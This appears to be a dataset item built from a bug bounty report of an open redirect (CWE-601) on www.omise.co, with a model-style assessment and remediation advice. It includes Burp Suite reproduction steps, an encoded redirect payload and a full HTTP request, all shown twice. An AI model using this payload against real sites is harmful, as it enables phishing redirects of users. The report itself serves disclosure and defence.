# REDIRECT — h1

- source: h1
- class: redirect
- cwe: CWE-601
- severity: low
- program: omise
- quality_score: 12

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** Open Redirect
**Affected Asset:** www.omise.co

**Vulnerability Description:**
A low-severity vulnerability was found that could allow an attacker to exploit a redirect weakness. Specifically:

Open Redirect Vulnerability

URL  : https://www.omise.co////bing.com/?www.omise.co/?category=interview&page=2  
 
Parameter Type  : URL Rewrite  

Attack Pattern  : %2f%2f%2fr87.com%2f%3fwww.omise.co%2f  


How to Reproduce

1. Intercept the below url using Burpsuite & send it to repeater

https://www.omise.co/?category=interview&page=2

2. Use this attack pattern 

/%2f%2f%2fbing.com%2f%3fwww.omise.co

3. Now it will redirect to bing.com



Below i will give u the Rquest body & also attaching the screenshots


GET /%2f%2f%2fbing.com%2f%3fwww.omise.co/?category=interview&page=2 HTTP/1.1
Host: www.omise.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: [REDACTED_COOKIE]
Upgrade-Insecure-Requests: 1

## Impact

An attacker can use this vulnerability to redirect users to other malicious websites, which can be used for phishing and similar attacks

The root weakness is Open Redirect.

**Steps to Reproduce:**
1. Intercept the below url using Burpsuite & send it to repeater

https://www.omise.co/?category=interview&page=2

2. Use this attack pattern 

/%2f%2f%2fbing.com%2f%3fwww.omise.co

3. Now it will redirect to bing.com



Below i will give u the Rquest body & also attaching the screenshots


GET /%2f%2f%2fbing.com%2f%3fwww.omise.co/?category=interview&page=2 HTTP/1.1
Host: www.omise.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: [REDACTED_COOKIE]
Upgrade-Insecure-Requests: 1

## Analysis / Response

**Vulnerability Class:** redirect
**CWE:** CWE-601
**Weakness:** Open Redirect
**Severity:** low
**Endpoint Pattern:** GET /%2f%2f%2fbing.com%2f%3fwww.omise.co/?category=interview&page=2

**Impact Assessment:**
An attacker can use this vulnerability to redirect users to other malicious websites, which can be used for phishing and similar attacks

**Remediation:**
Validate redirect URLs against an allowlist of permitted domains. Use relative URLs for internal redirects. Never place user input directly in redirect targets.
